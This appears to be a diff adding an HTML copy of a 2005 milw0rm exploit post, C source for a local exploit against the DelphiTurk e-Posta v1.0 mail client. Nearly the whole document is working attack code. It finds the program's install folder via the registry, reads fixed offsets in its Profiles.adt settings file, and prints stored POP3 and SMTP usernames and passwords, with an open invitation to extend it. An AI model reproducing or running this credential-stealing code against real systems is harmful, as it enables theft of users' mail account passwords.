@@ -1,0 +1,98 @@
+<html>
+<head>
+<title>DelphiTurk e-Posta v1.0 Local Exploit</title>
+<pre>
+/*****************************************************************
+
+DelphiTurk e-Posta v1.0 Local Exploit by Kozan
+
+Application: DelphiTurk e-Posta v1.0
+Procuder: Delphiturk.com
+Vulnerable Description: DelphiTurk e-Posta v1.0  discloses
+                                               passwords to local users.
+
+Coded by: Kozan
+Credits to ATmaCA
+Web : www.netmagister.com
+Web2: www.spyinstructors.com
+Mail: kozan[at]netmagister[dot]com
+
+*****************************************************************/
+
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+HKEY hKey;
+#define BUFSIZE 100
+char prgfiles[BUFSIZE];
+DWORD dwBufLen=BUFSIZE;
+LONG lRet;
+
+char *bilgi_oku(int adres,int uzunluk)
+{
+
+       if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+                                       &quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion&quot;,
+                                       0,
+                                       KEY_QUERY_VALUE,
+                                       &amp;hKey) == ERROR_SUCCESS)
+       {
+
+           lRet = RegQueryValueEx( hKey, &quot;ProgramFilesDir&quot;, NULL, NULL,
+              (LPBYTE) prgfiles, &amp;dwBufLen);
+
+                       if( (lRet != ERROR_SUCCESS) || (dwBufLen &gt; BUFSIZE) ){
+                                RegCloseKey(hKey);
+                                printf(&quot;An error occured!&quot;);
+                                return 0;
+                       }
+
+                       RegCloseKey(hKey);
+
+   }else{
+               printf(&quot;An error occured!\n&quot;);
+               exit(1);
+       }
+
+ strcat(prgfiles,&quot;\\Delphi Turk\\Delphi Türk e-Posta
+1.0\\Settings\\Profiles.adt&quot;);
+
+ int i;
+ FILE *fp;
+ char ch[100];
+ if((fp=fopen(prgfiles,&quot;rb&quot;)) == NULL)
+ {
+ return &quot;false&quot;;
+ }
+ fseek(fp,adres,0);
+ for(i=0;i&lt;uzunluk;i++)
+ ch[i]=getc(fp);
+ ch[i]=NULL;
+ fclose(fp);
+ return ch;
+}
+
+int main()
+{
+
+printf(&quot;\r\n\r\nDelphiTurk e-Posta v1.0 Local Exploit by Kozan\n&quot;);
+printf(&quot;Credits to ATmaCA\n&quot;);
+printf(&quot;www.netmagister.com   -   www.spyinstructors.com \r\n\r\n&quot;);
+printf(&quot;This example exploit only shows the first record.\r\n&quot;);
+printf(&quot;You may improve it freely...\r\n\r\n&quot;);
+printf(&quot;ProfileName           : %s\n&quot;,bilgi_oku(3609,25));
+printf(&quot;Profile UserName      : %s\n&quot;,bilgi_oku(3634,50));
+printf(&quot;Profile MailAddress   : %s\n&quot;,bilgi_oku(3684,40));
+printf(&quot;Pop3 Mail Server      : %s\n&quot;,bilgi_oku(3724,52));
+printf(&quot;Pop3 UserName         : %s\n&quot;,bilgi_oku(3776,50));
+printf(&quot;Pop3 Password         : %s\n&quot;,bilgi_oku(3826,50));
+printf(&quot;Smtp Mail Server      : %s\n&quot;,bilgi_oku(3976,52));
+printf(&quot;Smtp UserName         : %s\n&quot;,bilgi_oku(3928,50));
+printf(&quot;Smtp Password         : %s\n&quot;,bilgi_oku(3978,46));
+
+return 0;
+
+}</pre>
+// milw0rm.com [2005-02-10]
+</html>
+
